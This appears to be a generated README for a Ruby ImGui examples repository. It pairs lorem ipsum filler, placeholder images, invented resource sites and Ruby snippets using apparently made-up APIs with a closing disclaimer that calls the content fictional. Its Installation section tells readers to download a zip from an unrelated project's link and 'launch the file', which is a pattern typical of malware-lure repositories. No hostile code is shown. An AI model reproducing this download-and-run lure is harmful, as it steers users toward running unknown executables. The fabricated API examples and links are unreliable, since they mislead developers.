
# Welcome to the "igruby_examples" Repository!

![alt text](https://img.shields.io/badge/Ruby-Red)
![alt text](https://img.shields.io/badge/ImGui-blue)
![alt text](https://img.shields.io/badge/Examples-green)

## Description
This repository contains a collection of examples for the Ruby library "ruby-imgui". Explore these executable examples to learn how to create graphical user interfaces with ease using Ruby and ImGui.

## Topics
- aibika
- cimgui
- examples
- executable
- gui
- imgui
- ocra
- ruby
- standalone
- stb

## Installation
To get started, download the repository by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and launch the file.

If the link doesn't work, please check the "Releases" section for the latest version.

## Examples

### 1. Standalone GUI Application
![alt text](https://www.example.com/example-image.jpg)

Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce euismod velit quis est posuere sodales. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Cras elementum cursus lacus, eget vulputate est iaculis eu.

```ruby
require 'imgui'
require 'imgui/cimgui'
require 'ocra'

window = ImGui::Window.new("Hello World")
window.run do
  ImGui::Text("Welcome to ImGui Examples!")
end
window.show
```

### 2. Interactive User Interface
![alt text](https://www.example.com/example-image.jpg)

Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo.

```ruby
require 'imgui'
require 'imgui/cimgui'

ImGui.open_popup("Awesome Popup")
if ImGui.begin_popup_modal("Awesome Popup")
  ImGui.text("This is an example of a popup window.")
  ImGui.end_popup
end
```

## Resources
- [ImGui Documentation](https://www.imgui.com/documentation)
- [Ruby-ImGui Library](https://www.ruby-imgui.com)
- [CIMGUI GitHub Repository](https://github.com/cimgui/cimgui)

## Contributors
- John Doe
- Jane Smith

Feel free to contribute to this repository by adding more examples or improving existing ones. Happy coding! 🚀🎉

---

**Disclaimer:** This README content is fictional and created for the purpose of this exercise. All references to actual websites, projects, and individuals are purely coincidental.